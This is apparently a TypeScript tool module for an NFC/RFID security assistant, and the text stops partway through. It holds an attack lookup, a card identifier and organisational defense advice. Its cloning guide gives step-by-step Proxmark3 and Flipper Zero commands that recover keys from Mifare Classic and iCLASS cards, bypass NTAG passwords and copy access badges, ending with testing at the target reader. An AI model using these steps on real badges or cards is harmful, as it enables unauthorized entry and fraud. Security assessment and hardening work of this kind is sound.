import { z } from "zod";
import type { ToolDef, ToolContext, ToolResult } from "../types/index.js";
import { json, text } from "../types/index.js";
import { NFC_RFID_ATTACKS } from "../knowledge/index.js";
import type { NfcRfidAttack } from "../knowledge/index.js";

// ─── Helpers ───

function severityToNum(s: string): number {
  switch (s) {
    case "critical": return 4;
    case "high": return 3;
    case "medium": return 2;
    case "low": return 1;
    default: return 0;
  }
}

function formatAttack(attack: NfcRfidAttack) {
  return {
    id: attack.id,
    name: attack.name,
    category: attack.category,
    frequency: attack.frequency,
    protocols: attack.protocols,
    cves: attack.cves,
    description: attack.description,
    impact: attack.impact,
    prerequisites: attack.prerequisites,
    tools: attack.tools,
    commands: attack.commands,
    mitigations: attack.mitigations,
    severity: attack.severity,
    stealthScore: attack.stealthScore,
    references: attack.references,
  };
}

// ─── Card type database ───

interface CardType {
  type: string;
  fullName: string;
  frequency: string;
  standard: string;
  uidLength: number[];
  atqa: string[];
  sak: string[];
  crypto: string;
  vulnerabilities: string[];
  cloneTools: string[];
  attackIds: string[];
}

const CARD_TYPES: CardType[] = [
  {
    type: "em4100",
    fullName: "EM4100 / EM4102",
    frequency: "125 kHz",
    standard: "Proprietary (EM Microelectronic)",
    uidLength: [5],
    atqa: [],
    sak: [],
    crypto: "None — transmits fixed ID in plaintext",
    vulnerabilities: ["No authentication", "No encryption", "Trivially clonable", "Read range extendable with custom antenna"],
    cloneTools: ["proxmark3", "flipper-zero", "rfid-cloner"],
    attackIds: ["lf_clone"],
  },
  {
    type: "hid_prox",
    fullName: "HID ProxCard II / ISOProx",
    frequency: "125 kHz",
    standard: "HID proprietary (H10301 format common)",
    uidLength: [3, 6],
    atqa: [],
    sak: [],
    crypto: "None — fixed code transmitted",
    vulnerabilities: ["No authentication", "No encryption", "Facility code + card number transmitted in clear", "Trivially clonable with T5577 card"],
    cloneTools: ["proxmark3", "flipper-zero"],
    attackIds: ["lf_clone"],
  },
  {
    type: "mifare_classic_1k",
    fullName: "Mifare Classic 1K (MF1S50)",
    frequency: "13.56 MHz",
    standard: "ISO 14443-A",
    uidLength: [4, 7],
    atqa: ["0004", "0044"],
    sak: ["08", "88"],
    crypto: "Crypto1 (broken — 48-bit key)",
    vulnerabilities: ["Darkside attack (key recovery without any known key)", "Hardnested attack (key recovery with one known key)", "Weak PRNG (CVE-2008-1751)", "Default keys often not changed", "Nested authentication attack"],
    cloneTools: ["proxmark3", "flipper-zero", "chameleon-ultra", "mfoc"],
    attackIds: ["mifare_classic_darkside", "mifare_hardnested"],
  },
  {
    type: "mifare_classic_4k",
    fullName: "Mifare Classic 4K (MF1S70)",
    frequency: "13.56 MHz",
    standard: "ISO 14443-A",
    uidLength: [4, 7],
    atqa: ["0002", "0042"],
    sak: ["18", "98"],
    crypto: "Crypto1 (broken)",
    vulnerabilities: ["Same as Mifare Classic 1K", "Darkside attack", "Hardnested attack", "40 sectors (vs 16) but same weak crypto"],
    cloneTools: ["proxmark3", "mfoc"],
    attackIds: ["mifare_classic_darkside", "mifare_hardnested"],
  },
  {
    type: "mifare_desfire",
    fullName: "Mifare DESFire EV1/EV2/EV3",
    frequency: "13.56 MHz",
    standard: "ISO 14443-A",
    uidLength: [7],
    atqa: ["0344"],
    sak: ["20"],
    crypto: "DES/3DES/AES-128 (EV1+: AES)",
    vulnerabilities: ["EV1 side-channel attacks (mitigated in EV2)", "Misconfigured application permissions", "Default transport keys"],
    cloneTools: ["proxmark3 (limited — requires keys)"],
    attackIds: [],
  },
  {
    type: "mifare_ultralight",
    fullName: "Mifare Ultralight / NTAG21x",
    frequency: "13.56 MHz",
    standard: "ISO 14443-A",
    uidLength: [7],
    atqa: ["0044"],
    sak: ["00"],
    crypto: "None (Ultralight) / Password (NTAG213/215/216, 32-bit)",
    vulnerabilities: ["No encryption on basic Ultralight", "NTAG password is only 32-bit (brute-forceable)", "Data readable without authentication", "NFC NDEF injection possible"],
    cloneTools: ["proxmark3", "flipper-zero", "nfc-tools"],
    attackIds: ["nfc_ndef_injection"],
  },
  {
    type: "iclass",
    fullName: "HID iCLASS / iCLASS SE",
    frequency: "13.56 MHz",
    standard: "ISO 15693 (iCLASS) / ISO 14443-B (SE)",
    uidLength: [8],
    atqa: [],
    sak: [],
    crypto: "3DES (Standard) / AES-128 (SE/SEOS with Elite keys)",
    vulnerabilities: ["Standard iCLASS: loclass attack recovers master key", "Known master key for standard cards", "iCLASS SE with default (non-Elite) keys is vulnerable", "SEOS with Elite keys is currently secure"],
    cloneTools: ["proxmark3", "chameleon-mini"],
    attackIds: ["hid_iclass_clone"],
  },
  {
    type: "ntag",
    fullName: "NXP NTAG213 / NTAG215 / NTAG216",
    frequency: "13.56 MHz",
    standard: "ISO 14443-A",
    uidLength: [7],
    atqa: ["0044"],
    sak: ["00"],
    crypto: "32-bit password (optional)",
    vulnerabilities: ["Weak 32-bit password protection", "NDEF data readable without auth", "Clonable to blank NTAG chips", "Used in Amiibo (NTAG215) — easily cloned"],
    cloneTools: ["proxmark3", "flipper-zero", "nfc-tools"],
    attackIds: ["nfc_ndef_injection"],
  },
];

// ─── Tool 1: nfc_lookup_attack ───

const nfcLookupAttack: ToolDef = {
  name: "nfc_lookup_attack",
  description:
    "Look up an NFC/RFID attack by its unique ID from the NFC_RFID_ATTACKS knowledge base. Returns full attack details including frequency, protocols, tools, commands, and mitigations.",
  schema: {
    attack_id: z
      .string()
      .describe("The attack ID to look up (e.g. 'mifare_classic_darkside', 'mifare_hardnested', 'hid_iclass_clone', 'emv_relay', 'lf_clone', 'nfc_ndef_injection')"),
  },
  async execute(args: Record<string, unknown>): Promise<ToolResult> {
    const attackId = (args.attack_id as string).toLowerCase().trim();

    const attack = NFC_RFID_ATTACKS.find((a) => a.id === attackId);
    if (!attack) {
      const available = NFC_RFID_ATTACKS.map((a) => `${a.id} (${a.name})`).join(", ");
      return text(`NFC/RFID attack '${attackId}' not found. Available attacks: ${available}`);
    }

    return json(formatAttack(attack));
  },
};

// ─── Tool 2: nfc_search_attacks ───

const nfcSearchAttacks: ToolDef = {
  name: "nfc_search_attacks",
  description:
    "Search NFC/RFID attacks by criteria. Filter by category (nfc, rfid_lf, rfid_hf, rfid_uhf, emv, access_card), frequency band, or protocol name.",
  schema: {
    category: z
      .enum(["nfc", "rfid_lf", "rfid_hf", "rfid_uhf", "emv", "access_card"])
      .optional()
      .describe("Filter by attack category"),
    frequency: z
      .string()
      .optional()
      .describe("Filter by frequency (e.g. '125 kHz', '13.56 MHz'). Partial match on frequency field."),
    protocol: z
      .string()
      .optional()
      .describe("Filter by protocol name (e.g. 'Mifare', 'HID', 'EM4100', 'ISO 14443'). Partial match on protocols."),
  },
  async execute(args: Record<string, unknown>): Promise<ToolResult> {
    const category = args.category as string | undefined;
    const frequency = args.frequency as string | undefined;
    const protocol = args.protocol as string | undefined;

    let results = [...NFC_RFID_ATTACKS];

    if (category) {
      results = results.filter((a) => a.category === category);
    }

    if (frequency) {
      const freqLower = frequency.toLowerCase().replace(/\s+/g, "");
      results = results.filter((a) =>
        a.frequency.toLowerCase().replace(/\s+/g, "").includes(freqLower)
      );
    }

    if (protocol) {
      const protoLower = protocol.toLowerCase();
      results = results.filter((a) =>
        a.protocols.some((p) => p.toLowerCase().includes(protoLower))
      );
    }

    if (results.length === 0) {
      return text("No NFC/RFID attacks found matching the specified criteria. Try broadening your search filters.");
    }

    results.sort((a, b) => severityToNum(b.severity) - severityToNum(a.severity));

    return json({
      totalResults: results.length,
      filters: { category, frequency, protocol },
      attacks: results.map((a) => ({
        id: a.id,
        name: a.name,
        category: a.category,
        frequency: a.frequency,
        protocols: a.protocols,
        severity: a.severity,
        stealthScore: a.stealthScore,
        cves: a.cves,
        impact: a.impact,
        tools: a.tools,
      })),
    });
  },
};

// ─── Tool 3: nfc_card_identify ───

const nfcCardIdentify: ToolDef = {
  name: "nfc_card_identify",
  description:
    "Identify NFC/RFID card type from scan parameters. For HF (13.56 MHz) cards, provide UID length, ATQA, and SAK values. For LF (125 kHz) cards, provide data rate and modulation. Returns card type, known vulnerabilities, and applicable attacks.",
  schema: {
    uid_length: z
      .number()
      .optional()
      .describe("UID length in bytes (4 or 7 for ISO 14443-A, 8 for iCLASS, 5 for EM4100)"),
    atqa: z
      .string()
      .optional()
      .describe("ATQA value (Answer To Request Type A) as hex string (e.g. '0004', '0044', '0344') — HF cards only"),
    sak: z
      .string()
      .optional()
      .describe("SAK value (Select Acknowledge) as hex string (e.g. '08', '18', '20', '00') — HF cards only"),
    data_rate: z
      .string()
      .optional()
      .describe("Data rate for LF cards (e.g. 'RF/64', 'RF/32')"),
    modulation: z
      .string()
      .optional()
      .describe("Modulation type for LF cards (e.g. 'ASK', 'FSK', 'PSK')"),
  },
  async execute(args: Record<string, unknown>): Promise<ToolResult> {
    const uidLength = args.uid_length as number | undefined;
    const atqa = (args.atqa as string | undefined)?.toLowerCase().replace("0x", "");
    const sak = (args.sak as string | undefined)?.toLowerCase().replace("0x", "");
    const dataRate = args.data_rate as string | undefined;
    const modulation = args.modulation as string | undefined;

    const matches: CardType[] = [];

    for (const card of CARD_TYPES) {
      let score = 0;

      // UID length match
      if (uidLength !== undefined && card.uidLength.includes(uidLength)) {
        score += 2;
      }

      // ATQA match (strongest indicator for HF)
      if (atqa && card.atqa.length > 0) {
        if (card.atqa.some((a) => a.toLowerCase() === atqa)) {
          score += 5;
        }
      }

      // SAK match
      if (sak && card.sak.length > 0) {
        if (card.sak.some((s) => s.toLowerCase() === sak)) {
          score += 4;
        }
      }

      // LF modulation match
      if (modulation && card.frequency === "125 kHz") {
        score += 3;
      }

      // LF data rate match (EM4100 specific)
      if (dataRate && card.frequency === "125 kHz") {
        score += 2;
      }

      if (score > 0) {
        matches.push(card);
      }
    }

    // Sort by match quality (prefer ATQA+SAK matches)
    if (matches.length === 0) {
      return json({
        identified: false,
        parameters: { uidLength, atqa, sak, dataRate, modulation },
        message: "Could not identify card type from the provided parameters.",
        suggestions: [
          "For HF cards: provide ATQA and SAK values (from 'hf search' or 'hf 14a reader')",
          "For LF cards: provide modulation and data rate (from 'lf search')",
          "Common ATQA/SAK combos: Mifare Classic 1K (0004/08), Classic 4K (0002/18), DESFire (0344/20), Ultralight (0044/00)",
        ],
        identificationCommands: [
          { tool: "proxmark3", command: "hf search", description: "Auto-detect HF card type" },
          { tool: "proxmark3", command: "lf search", description: "Auto-detect LF card type" },
          { tool: "proxmark3", command: "hf 14a reader", description: "Read ISO 14443-A card UID, ATQA, SAK" },
          { tool: "proxmark3", command: "lf em 410x reader", description: "Read EM4100 card" },
          { tool: "flipper-zero", command: "NFC > Detect Reader / Read", description: "Auto-detect NFC card" },
          { tool: "flipper-zero", command: "125 kHz RFID > Read", description: "Auto-detect LF card" },
        ],
      });
    }

    const bestMatch = matches[0];

    // Get applicable attacks
    const applicableAttacks = NFC_RFID_ATTACKS.filter((a) =>
      bestMatch.attackIds.includes(a.id)
    ).map((a) => ({
      id: a.id,
      name: a.name,
      severity: a.severity,
      impact: a.impact,
      tools: a.tools,
    }));

    return json({
      identified: true,
      parameters: { uidLength, atqa, sak, dataRate, modulation },
      cardType: {
        type: bestMatch.type,
        fullName: bestMatch.fullName,
        frequency: bestMatch.frequency,
        standard: bestMatch.standard,
        crypto: bestMatch.crypto,
      },
      vulnerabilities: bestMatch.vulnerabilities,
      applicableAttacks,
      cloneTools: bestMatch.cloneTools,
      allMatches: matches.map((c) => ({
        type: c.type,
        fullName: c.fullName,
        frequency: c.frequency,
      })),
      nextSteps: [
        `Identified as ${bestMatch.fullName}`,
        bestMatch.vulnerabilities.length > 0 ? `Known vulnerabilities: ${bestMatch.vulnerabilities.length}` : "No known vulnerabilities",
        `Clone tools: ${bestMatch.cloneTools.join(", ")}`,
        applicableAttacks.length > 0 ? `${applicableAttacks.length} applicable attack(s) available` : "No pre-built attacks in knowledge base",
      ],
    });
  },
};

// ─── Tool 4: nfc_clone_guide ───

const nfcCloneGuide: ToolDef = {
  name: "nfc_clone_guide",
  description:
    "Step-by-step guide for cloning NFC/RFID cards. Provides Proxmark3 and Flipper Zero commands for the specified card type. Optionally uses known sector keys for Mifare Classic cloning.",
  schema: {
    card_type: z
      .enum(["em4100", "hid_prox", "mifare_classic", "mifare_desfire", "iclass", "ntag"])
      .describe("Card type to clone"),
    known_keys: z
      .string()
      .optional()
      .describe("Known sector keys as comma-separated hex strings (e.g. 'FFFFFFFFFFFF,A0A1A2A3A4A5') for Mifare Classic"),
  },
  async execute(args: Record<string, unknown>): Promise<ToolResult> {
    const cardType = args.card_type as string;
    const knownKeys = args.known_keys as string | undefined;

    interface CloneGuide {
      cardType: string;
      difficulty: string;
      requiredHardware: string[];
      requiredCards: string[];
      steps: { step: number; title: string; commands: { tool: string; command: string; description: string }[]; notes: string }[];
      warnings: string[];
    }

    let guide: CloneGuide;

    switch (cardType) {
      case "em4100":
        guide = {
          cardType: "EM4100 / EM4102 (125 kHz)",
          difficulty: "trivial",
          requiredHardware: ["Proxmark3 or Flipper Zero"],
          requiredCards: ["T5577 blank writable card"],
          steps: [
            {
              step: 1,
              title: "Read original card",
              commands: [
                { tool: "proxmark3", command: "lf em 410x reader", description: "Read EM4100 card ID" },
                { tool: "proxmark3", command: "lf search", description: "Auto-detect LF card and read" },
                { tool: "flipper-zero", command: "125 kHz RFID > Read", description: "Read card with Flipper" },
              ],
              notes: "Hold card flat against the reader antenna. Note the 10-character hex ID.",
            },
            {
              step: 2,
              title: "Clone to T5577 blank",
              commands: [
                { tool: "proxmark3", command: "lf em 410x clone --id <card_id>", description: "Write EM4100 ID to T5577 card" },
                { tool: "flipper-zero", command: "125 kHz RFID > Saved > Emulate", description: "Emulate directly from Flipper (no blank needed)" },
              ],
              notes: "T5577 cards can emulate EM4100, HID, and other LF protocols. Replace <card_id> with the ID read in step 1.",
            },
            {
              step: 3,
              title: "Verify clone",
              commands: [
                { tool: "proxmark3", command: "lf em 410x reader", description: "Read cloned card to verify" },
              ],
              notes: "Verify the cloned card shows the same ID as the original.",
            },
          ],
          warnings: [
            "EM4100 has zero security — anyone within 5cm can read it",
            "Extended-range antennas can read from 30cm+",
          ],
        };
        break;

      case "hid_prox":
        guide = {
          cardType: "HID ProxCard II (125 kHz)",
          difficulty: "trivial",
          requiredHardware: ["Proxmark3 or Flipper Zero"],
          requiredCards: ["T5577 blank writable card"],
          steps: [
            {
              step: 1,
              title: "Read original HID card",
              commands: [
                { tool: "proxmark3", command: "lf hid reader", description: "Read HID Prox card" },
                { tool: "proxmark3", command: "lf search", description: "Auto-detect and read" },
                { tool: "flipper-zero", command: "125 kHz RFID > Read", description: "Read with Flipper" },
              ],
              notes: "Note the facility code (FC) and card number (CN).",
            },
            {
              step: 2,
              title: "Clone to T5577",
              commands: [
                { tool: "proxmark3", command: "lf hid clone -w H10301 --fc <facility_code> --cn <card_number>", description: "Clone HID H10301 format" },
                { tool: "proxmark3", command: "lf hid clone -r <raw_hex>", description: "Clone using raw hex data" },
                { tool: "flipper-zero", command: "125 kHz RFID > Saved > Write", description: "Write saved card to T5577" },
              ],
              notes: "H10301 is the most common HID format (26-bit). Adjust -w flag for other formats (H10302, H10304, Corporate 1000).",
            },
            {
              step: 3,
              title: "Verify and test",
              commands: [
                { tool: "proxmark3", command: "lf hid reader", description: "Verify cloned card" },
              ],
              notes: "Test at target reader to confirm access.",
            },
          ],
          warnings: [
            "HID Prox has no encryption — trivially clonable",
            "If card number is unknown, brute force FC/CN range with 'lf hid brute'",
          ],
        };
        break;

      case "mifare_classic":
        const keyList = knownKeys?.split(",").map((k) => k.trim()) || [];
        guide = {
          cardType: "Mifare Classic 1K/4K (13.56 MHz)",
          difficulty: keyList.length > 0 ? "easy" : "moderate",
          requiredHardware: ["Proxmark3 RDV4"],
          requiredCards: ["Mifare Classic 1K blank (UID changeable / Magic card)"],
          steps: [
            {
              step: 1,
              title: "Read card and identify",
              commands: [
                { tool: "proxmark3", command: "hf 14a reader", description: "Read UID, ATQA, SAK" },
                { tool: "proxmark3", command: "hf mf info", description: "Get Mifare Classic details" },
              ],
              notes: "Identify card type (1K = SAK 08, 4K = SAK 18). Note the UID.",
            },
            {
              step: 2,
              title: "Recover sector keys",
              commands: keyList.length > 0
                ? [
                    { tool: "proxmark3", command: `hf mf chk --1k -k ${keyList.join(" -k ")}`, description: "Check known keys against all sectors" },
                    { tool: "proxmark3", command: "hf mf hardnested --blk 0 -a -k FFFFFFFFFFFF --tblk 4 --ta", description: "Hardnested from known key to recover remaining keys" },
                    { tool: "proxmark3", command: "hf mf autopwn", description: "Automatic full key recovery + dump" },
                  ]
                : [
                    { tool: "proxmark3", command: "hf mf chk --1k", description: "Check default keys (FFFFFFFFFFFF, A0A1A2A3A4A5, etc.)" },
                    { tool: "proxmark3", command: "hf mf darkside", description: "Darkside attack — recover first key without any known key" },
                    { tool: "proxmark3", command: "hf mf autopwn", description: "Automatic key recovery using all available attacks" },
                    { tool: "mfoc", command: "mfoc -O card_dump.mfd", description: "Alternative: mfoc for full card dump with key recovery" },
                  ],
              notes: keyList.length > 0
                ? `Using provided keys: ${keyList.join(", ")}. Hardnested will recover remaining keys.`
                : "No keys provided. Will attempt default keys, then Darkside attack to recover first key, then Hardnested for the rest.",
            },
            {
              step: 3,
              title: "Dump card data",
              commands: [
                { tool: "proxmark3", command: "hf mf dump", description: "Dump all sectors using recovered keys" },
                { tool: "proxmark3", command: "hf mf dump --1k -f card_dump", description: "Save dump to file" },
              ],
              notes: "Card dump is saved as .bin and .eml files.",
            },
            {
              step: 4,
              title: "Write to blank card",
              commands: [
                { tool: "proxmark3", command: "hf mf csetuid <original_uid>", description: "Set UID on Magic card to match original" },
                { tool: "proxmark3", command: "hf mf restore --1k -f card_dump", description: "Write dump to blank card" },
                { tool: "proxmark3", command: "hf mf cload -f card_dump.eml", description: "Alternative: load eml file to Magic card" },
              ],
              notes: "Use UID-changeable (Magic/Gen1a/Gen2) Mifare cards. Gen2 (CUID) cards are recommended — they respond to normal readers without the magic backdoor.",
            },
            {
              step: 5,
              title: "Verify clone",
              commands: [
                { tool: "proxmark3", command: "hf mf dump --1k -f clone_verify", description: "Dump cloned card" },
                { tool: "proxmark3", command: "diff card_dump.bin clone_verify.bin", description: "Compare original and clone dumps" },
              ],
              notes: "Ensure all sectors match. Test at target reader.",
            },
          ],
          warnings: [
            "Mifare Classic Crypto1 is fundamentally broken — key recovery always succeeds",
            "Gen1a magic cards respond to magic backdoor commands — detectable by some readers",
            "Gen2 (CUID) cards are preferred — no detectable backdoor",
            "Some systems check sector 0 block 0 (manufacturer block) — ensure it matches",
          ],
        };
        break;

      case "mifare_desfire":
        guide = {
          cardType: "Mifare DESFire EV1/EV2/EV3 (13.56 MHz)",
          difficulty: "very hard",
          requiredHardware: ["Proxmark3 RDV4"],
          requiredCards: ["Mifare DESFire blank (if keys are recovered)"],
          steps: [
            {
              step: 1,
              title: "Read card and enumerate applications",
              commands: [
                { tool: "proxmark3", command: "hf 14a reader", description: "Read card UID and type" },
                { tool: "proxmark3", command: "hf mfdes info", description: "Get DESFire card information" },
                { tool: "proxmark3", command: "hf mfdes getaids", description: "List all application IDs" },
              ],
              notes: "DESFire uses application-based storage. Each application has its own keys.",
            },
            {
              step: 2,
              title: "Attempt default key authentication",
              commands: [
                { tool: "proxmark3", command: "hf mfdes auth -n 0 -t des -k 0000000000000000", description: "Try default DES key on master app" },
                { tool: "proxmark3", command: "hf mfdes auth -n 0 -t aes -k 00000000000000000000000000000000", description: "Try default AES key" },
              ],
              notes: "DESFire uses DES, 3DES, or AES-128 keys. Default transport keys are all zeros.",
            },
            {
              step: 3,
              title: "Read application files (if authenticated)",
              commands: [
                { tool: "proxmark3", command: "hf mfdes getfiles --aid <app_id>", description: "List files in application" },
                { tool: "proxmark3", command: "hf mfdes readdata --aid <app_id> --fid <file_id>", description: "Read file data" },
              ],
              notes: "Without valid keys, DESFire data cannot be read. Side-channel attacks exist for EV1 but are complex.",
            },
          ],
          warnings: [
            "DESFire EV2/EV3 with non-default keys is currently considered secure against cloning",
            "EV1 has known side-channel vulnerabilities but exploitation is complex",
            "Cloning requires all application keys — no known cryptographic attack on AES keys",
            "Consider emulation (Chameleon Ultra) instead of full cloning if application structure is known",
          ],
        };
        break;

      case "iclass":
        guide = {
          cardType: "HID iCLASS (13.56 MHz)",
          difficulty: "moderate",
          requiredHardware: ["Proxmark3 RDV4 with iCLASS support"],
          requiredCards: ["iCLASS blank card or Chameleon Mini/Ultra"],
          steps: [
            {
              step: 1,
              title: "Read iCLASS card",
              commands: [
                { tool: "proxmark3", command: "hf iclass reader", description: "Read iCLASS card CSN and CC" },
                { tool: "proxmark3", command: "hf iclass info", description: "Get card information" },
              ],
              notes: "Note the CSN (Card Serial Number) and Configuration Card (CC) data.",
            },
            {
              step: 2,
              title: "Recover keys (Standard iCLASS)",
              commands: [
                { tool: "proxmark3", command: "hf iclass loclass", description: "Loclass attack — recover iCLASS master key" },
                { tool: "proxmark3", command: "hf iclass dump -k <recovered_key>", description: "Dump card with recovered key" },
              ],
              notes: "Loclass attack works against standard iCLASS (non-Elite). Takes ~15 minutes on Proxmark3 RDV4.",
            },
            {
              step: 3,
              title: "Clone card",
              commands: [
                { tool: "proxmark3", command: "hf iclass clone --cc <cc_data>", description: "Clone iCLASS to blank card" },
                { tool: "proxmark3", command: "hf iclass wrbl -b <block> -d <data> -k <key>", description: "Write specific blocks" },
              ],
              notes: "Write credential data blocks to blank iCLASS card.",
            },
          ],
          warnings: [
            "iCLASS SE with Elite keys is more secure — loclass does not work",
            "iCLASS SEOS uses different protocol entirely — not clonable with standard methods",
            "Some readers check for cloned cards by verifying MAC of credential data",
          ],
        };
        break;

      case "ntag":
        guide = {
          cardType: "NXP NTAG213/215/216 (13.56 MHz)",
          difficulty: "easy",
          requiredHardware: ["Proxmark3, Flipper Zero, or NFC-capable phone"],
          requiredCards: ["Blank NTAG215 card (for full clone) or any NFC tag (for NDEF)"],
          steps: [
            {
              step: 1,
              title: "Read NTAG card",
              commands: [
                { tool: "proxmark3", command: "hf mfu info", description: "Read NTAG info and configuration" },
                { tool: "proxmark3", command: "hf mfu dump", description: "Dump all NTAG pages" },
                { tool: "flipper-zero", command: "NFC > Read", description: "Read NFC tag" },
              ],
              notes: "NTAG213 = 144 bytes, NTAG215 = 504 bytes, NTAG216 = 888 bytes.",
            },
            {
              step: 2,
              title: "Bypass password (if set)",
              commands: [
                { tool: "proxmark3", command: "hf mfu pwdgen -r", description: "Try known password generation algorithms" },
                { tool: "proxmark3", command: "hf mfu otptear", description: "OTP tear-off attack on password counter" },
              ],
              notes: "NTAG password is only 32 bits. Known manufacturers use predictable algorithms.",
            },
            {
              step: 3,
              title: "Write to blank NTAG",
              commands: [
                { tool: "proxmark3", command: "hf mfu restore -f ntag_dump", description: "Restore dump to blank NTAG" },
                { tool: "proxmark3", command: "hf mfu wrbl -b 4 -d <page_data>", description: "Write individual pages" },
                { tool: "flipper-zero", command: "NFC > Saved > Write", description: "Write saved NFC data" },
              ],
              notes: "UID cannot be changed on standard NTAGs. Use Magic NTAG cards for UID cloning.",
            },
          ],
          warnings: [
            "NTAG UID is read-only on genuine chips — use Magic NTAG for full clone",
            "NTAG215 is used for Nintendo Amiibo — easily cloned with NTAG215 blanks",
            "Password protection only covers specific memory pages, not the entire tag",
          ],
        };
        break;

      default:
        return text(`Unknown card type '${cardType}'. Supported: em4100, hid_prox, mifare_classic, mifare_desfire, iclass, ntag`);
    }

    return json(guide);
  },
};

// ─── Tool 5: nfc_defense ───

const nfcDefense: ToolDef = {
  name: "nfc_defense",
  description:
    "NFC/RFID defense recommendations for organizations. Provides upgrade paths, security best practices, and monitoring recommendations based on the deployment type (physical access control, payment systems, or inventory tracking).",
  schema: {
    deployment: z
      .enum(["physical_access", "payment", "inventory"])
      .describe("Deployment type: physical_access (door access control), payment (EMV/contactless), inventory (asset tracking/supply chain)"),
  },
  async execute(args: Record<string, unknown>): Promise<ToolResult> {
    const deployment = args.deployment as string;

    interface DefenseRecommendation {
      category: string;
      priority: "critical" | "high" | "medium" | "low";
      recommendation: string;
      implementation: string;
    }

    let recommendations: DefenseRecommendation[];
    let currentThreats: string[];
    let upgradePath: { from: string; to: string; benefit: string; cost: string }[];

    switch (deployment) {
      case "physical_access":
        currentThreats = [
          "LF RFID cloning (EM4100, HID Prox) — trivial with $30 hardware",
          "Mifare Classic key recovery — Darkside/Hardnested attacks succeed in minutes",
          "HID iCLASS standard — loclass attack recovers master key",
          "Card relay attacks — extend range of contactless cards over network",
          "Tailgating with cloned cards — no way to distinguish clone from original",
        ];
        upgradePath = [
          { from: "EM4100 (125 kHz)", to: "HID SEOS / Mifare DESFire EV3", benefit: "AES-128 encryption, mutual authentication, no known attacks", cost: "$5-15 per card, reader upgrade required" },
          { from: "HID Prox (125 kHz)", to: "HID iCLASS SE/SEOS with Elite Keys", benefit: "AES encryption, Elite key diversification", cost: "$8-20 per card, firmware update on readers" },
          { from: "Mifare Classic", to: "Mifare DESFire EV2/EV3", benefit: "AES-128, no known crypto attacks, application-level security", cost: "$3-10 per card, reader compatible (ISO 14443)" },
          { from: "HID iCLASS Standard", to: "HID iCLASS SE with Elite Keys", benefit: "AES encryption, immune to loclass attack", cost: "$5-15 per card, encoder update" },
        ];
        recommendations = [
          { category: "Card Technology", priority: "critical", recommendation: "Replace all 125 kHz LF cards (EM4100, HID Prox) with 13.56 MHz encrypted cards", implementation: "Phase rollout: issue new cards to high-security areas first, then company-wide" },
          { category: "Card Technology", priority: "critical", recommendation: "Replace Mifare Classic with DESFire EV2/EV3 or SEOS", implementation: "DESFire is ISO 14443-A compatible — same readers, new cards" },
          { category: "Multi-Factor", priority: "high", recommendation: "Implement card + PIN for sensitive areas", implementation: "Deploy PIN pad readers at server rooms, executive areas, and restricted zones" },
          { category: "Multi-Factor", priority: "medium", recommendation: "Add biometric verification for highest-security areas", implementation: "Fingerprint or facial recognition as second factor" },
          { category: "Monitoring", priority: "high", recommendation: "Implement anti-passback and dual-card detection", implementation: "Alert when same card is used at two locations simultaneously" },
          { category: "Monitoring", priority: "medium", recommendation: "Deploy RFID monitoring for unauthorized readers", implementation: "Detect rogue RFID readers near high-traffic areas (entrance, elevator)" },
          { category: "Key Management", priority: "high", recommendation: "Use per-card diversified keys (never shared master key across all cards)", implementation: "Configure card encoder to derive unique keys per card serial number" },
          { category: "Physical", priority: "medium", recommendation: "Use RFID-shielding badge holders", implementation: "Issue RFID-blocking sleeves or wallets to prevent unauthorized reading" },
        ];
        break;

      case "payment":
        currentThreats = [
          "EMV relay attack — relay NFC between card and terminal over network",
          "Contactless skimming — read card data from proximity",
          "Magstripe fallback — downgrade from chip to magnetic stripe",
          "Transaction replay — replay captured transaction in some implementations",
        ];
        upgradePath = [
          { from: "Magstripe", to: "EMV Chip (contact)", benefit: "Dynamic authentication, no static data replay", cost: "Terminal upgrade $200-500" },
          { from: "EMV Contactless (first gen)", to: "EMV Contactless with CDA", benefit: "Combined Data Authentication prevents relay", cost: "Terminal firmware update" },
          { from: "Static CVM", to: "Cardholder Verification with biometrics", benefit: "On-card fingerprint verification for high-value transactions", cost: "$15-25 per biometric card" },
        ];
        recommendations = [
          { category: "Protocol", priority: "critical", recommendation: "Disable magstripe fallback on all terminals", implementation: "Configure terminals to reject magstripe if chip is present" },
          { category: "Protocol", priority: "high", recommendation: "Implement distance bounding to prevent relay attacks", implementation: "Use EMV 3.0 with relay-resistant protocol extensions" },
          { category: "Limits", priority: "high", recommendation: "Set contactless transaction limits and require PIN above threshold", implementation: "Configure CVM limit (typically $50-100 for contactless without PIN)" },
          { category: "Monitoring", priority: "high", recommendation: "Implement real-time transaction velocity monitoring", implementation: "Alert on multiple contactless transactions in rapid succession" },
          { category: "Monitoring", priority: "medium", recommendation: "Geolocation anomaly detection", implementation: "Flag transactions in different cities within impossible travel time" },
          { category: "Tokenization", priority: "high", recommendation: "Use payment tokenization (Apple Pay, Google Pay)", implementation: "Tokens are device-specific and expire — no persistent card number exposure" },
          { category: "Physical", priority: "medium", recommendation: "Issue RFID-blocking card sleeves", implementation: "Prevent contactless skimming when card is in wallet" },
        ];
        break;

      case "inventory":
        currentThreats = [
          "RFID cloning — clone inventory tags to manipulate stock counts",
          "RFID eavesdropping — read tag data from distance with high-gain antenna",
          "Tag injection — add fake tags to inventory system",
          "Denial of service — jam RFID frequencies to prevent reading",
          "Data tampering — modify tag data to change product information",
        ];
        upgradePath = [
          { from: "Passive LF/HF tags (no auth)", to: "UHF tags with authentication (NXP UCODE DNA)", benefit: "Crypto authentication prevents cloning", cost: "$0.50-2 per tag" },
          { from: "Standard EPC Gen2", to: "EPC Gen2v2 with crypto suite", benefit: "AES-128 authentication, encrypted tag memory", cost: "$1-5 per tag" },
          { from: "Unencrypted NFC tags", to: "NTAG 424 DNA with SUN authentication", benefit: "Unique code per scan, cloud verification, tamper detection", cost: "$1-3 per tag" },
        ];
        recommendations = [
          { category: "Authentication", priority: "high", recommendation: "Use RFID tags with cryptographic authentication", implementation: "Deploy NXP UCODE DNA (UHF) or NTAG 424 DNA (NFC) with per-tag keys" },
          { category: "Data Protection", priority: "high", recommendation: "Encrypt sensitive data on tags", implementation: "Use tag-level AES encryption for product and pricing data" },
          { category: "Backend", priority: "high", recommendation: "Implement server-side validation of all tag reads", implementation: "Cross-reference tag data with backend database, flag anomalies" },
          { category: "Physical", priority: "medium", recommendation: "Use tamper-evident RFID tags for high-value items", implementation: "Tags that self-destruct when removed from product" },
          { category: "Monitoring", priority: "medium", recommendation: "Monitor for RFID jamming attempts", implementation: "Deploy RF spectrum monitors in warehouse/retail areas" },
